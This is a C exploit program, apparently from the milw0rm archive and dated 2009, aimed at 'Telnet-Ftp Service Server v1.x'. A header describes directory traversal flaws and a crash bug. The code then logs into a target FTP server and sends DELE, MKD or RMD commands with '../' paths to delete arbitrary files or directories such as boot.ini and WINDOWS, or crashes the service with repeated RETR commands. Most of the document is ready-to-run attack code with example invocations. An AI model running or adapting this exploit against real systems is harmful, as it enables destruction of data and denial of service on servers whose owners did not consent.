/*
Telnet-Ftp Service Server v1.x
------------------------------
Multiple Vulnerability:
			-Remote Creat File
			-Remote Delet File
			-Remote Creat Directory
			-Remote Delet Directory
			-Remote Get   File
			-Remote Crash 

--------------------------------------------------------------------------------------------------------
Arbitrary:
----------
A vulnerability is caused due to an input validation error when handling FTP "DELE","RETR","MKD","RMD"
requests. This can be exploited to escape the FTP root and delete arbitrary files, get arbitrary files,
creat arbitrary directory, or delete arbitrary directory on the system via directory traversal 
attacks using the "../" character sequence.

Remote Crash:
-------------
The vulnerability is caused due to an error in handling the RETR command. This can be exploited to crash 
the FTP service by sending the "RETR" command without sending the "PORT" command.
--------------------------------------------------------------------------------------------------------

You can delet file boot.ini 	=> DELE ../../boot.ini
You can get file boot.ini 	=> RETR ../../boot.ini
You can creat Directory 	=> MKD ../../poc
You can delet Directory		=> RMD ../../WINDOWS
You can crash service 		=> (RETR 0)x2

Author: Jonathan Salwan
Mail  : submit [AT] shell-storm.org
Web   : http://www.shell-storm.org
*/

#include "stdio.h"
#include "unistd.h"
#include "stdlib.h"
#include "sys/types.h"
#include "sys/socket.h"
#include "netinet/in.h"

int syntax(char *file)
	{
	fprintf(stderr,"\nTelnet-Ftp Service Server v1.x Multiple Vulnerability\n");
	fprintf(stderr,"-----------------------------------------------------\n");
	fprintf(stderr,"=>Syntax  : <%s> <ip> <port> <login> <passwd> <option> <argument_option>\n\n",file);
	fprintf(stdout,"=>Option  : -df\t\tDelet File\n");
	fprintf(stdout,"            -cd\t\tCreat Directory\n");
	fprintf(stdout,"            -dd\t\tDelet Directory\n");
	fprintf(stdout,"            -crash\tRemote Crash with Request RETR\n\n");
	fprintf(stdout,"=>Exemple : %s 127.0.0.1 21 login1 passwd2 -df ../../boot.ini\n", file);
	fprintf(stdout,"          : %s 127.0.0.1 21 login1 passwd2 -cd ../../poc\n", file);
	fprintf(stdout,"          : %s 127.0.0.1 21 login1 passwd2 -dd ../../WINDOWS\n\n", file);
	fprintf(stdout,"=>Crash   : %s 127.0.0.1 21 anonymous aaaa -crash\n\n", file);
	exit(0);
	}

int main(int argc, char **argv)
{
	if (argc < 6)
		syntax(argv[0]);
	
	int port = atoi(argv[2]);

	int mysocket;
	int mysocket2;
	int srv_connect;
	int sockaddr_long;


		struct sockaddr_in sockaddr_mysocket;
		sockaddr_long = sizeof(sockaddr_mysocket);
		sockaddr_mysocket.sin_family = AF_INET;
		sockaddr_mysocket.sin_addr.s_addr = inet_addr(argv[1]);
		sockaddr_mysocket.sin_port = htons(port);

        char request[50];
	char answer[100];

        fprintf(stdout,"[+]Connect to Server %s\n",argv[1]);

                mysocket2 = socket(AF_INET, SOCK_STREAM, 0);
                        if(mysocket2 == -1){
                        fprintf(stderr,"[-]FAILED SOCKET\n");
			return 1;}

	srv_connect = connect(mysocket2, (struct sockaddr*)&sockaddr_mysocket, sockaddr_long);
		
	if (srv_connect != -1)
 		{	

		sprintf(request, "USER %s\r\n", argv[3]);		
			if (send(mysocket2,request,strlen(request),0) == -1){
				fprintf(stderr,"[-]Send Request USER\t\t[FAILED]\n");
				shutdown(mysocket2,1);
				return 1;}
			else{
				memset(answer,0,100);
				recv(mysocket2,answer,sizeof(answer),0);
			 }


		sprintf(request, "PASS %s\r\n", argv[4]);
                        if (send(mysocket2,request,strlen(request),0) == -1){
                                fprintf(stderr,"[-]Send Request PASS\t\t[FAILED]\n");
                                shutdown(mysocket2,1);
                                return 1;}
                        else{ 
				memset(answer,0,100);
                                recv(mysocket2,answer,sizeof(answer),0);
                                fprintf(stdout,"[+]>>%s",answer);
                         }


                sprintf(request, "SYST\r\n");
                        if (send(mysocket2,request,strlen(request),0) == -1){
                                fprintf(stderr,"[-]Send Request PASS\t\t[FAILED]\n");
                                shutdown(mysocket2,1);
                                return 1;}
                        else{
                                memset(answer,0,100);
                                recv(mysocket2,answer,sizeof(answer),0);
                                fprintf(stdout,"[+]>>%s",answer);
                         }

			if(!strcmp(argv[5], "-df")){
						sprintf(request, "DELE %s\r\n", argv[6]);
							if (send(mysocket2,request,strlen(request),0) == -1){
								fprintf(stderr,"[-]Send Request DELE\t\t[FAILED]\n");
								shutdown(mysocket2,1);
								return 1;}
							else{ 
								memset(answer,0,100);
								recv(mysocket2,answer,sizeof(answer),0);
								fprintf(stdout,"[+]>>%s",answer);
							 }
						}
			if(!strcmp(argv[5], "-cd")){
						sprintf(request, "MKD %s\r\n", argv[6]);
							if (send(mysocket2,request,strlen(request),0) == -1){
								fprintf(stderr,"[-]Send Request MKD\t\t[FAILED]\n");
								shutdown(mysocket2,1);
								return 1;}
							else{ 
								memset(answer,0,100);
								recv(mysocket2,answer,sizeof(answer),0);
								fprintf(stdout,"[+]>>%s",answer);
							 }
						}
			if(!strcmp(argv[5], "-dd")){
						sprintf(request, "RMD %s\r\n", argv[6]);
							if (send(mysocket2,request,strlen(request),0) == -1){
								fprintf(stderr,"[-]Send Request RMD\t\t[FAILED]\n");
								shutdown(mysocket2,1);
								return 1;}
							else{ 
								memset(answer,0,100);
								recv(mysocket2,answer,sizeof(answer),0);
								fprintf(stdout,"[+]>>%s",answer);
							 }
						}
			if(!strcmp(argv[5], "-crash")){
						sprintf(request, "RETR O\r\nRETR 0\r\n");
							if (send(mysocket2,request,strlen(request),0) == -1){
								fprintf(stderr,"[-]Send Request RETR\t\t[FAILED]\n");
								shutdown(mysocket2,1);
								return 1;}	 
						}

		}
	else{
		fprintf(stderr,"[-]Connect\t\t[FAILED]\n");
		shutdown(mysocket2,1);
		return 1;}


	shutdown(mysocket2,1);


fprintf(stdout,"[+]Done!\n", argv[5]);
return 0;
}

// milw0rm.com [2009-03-23]
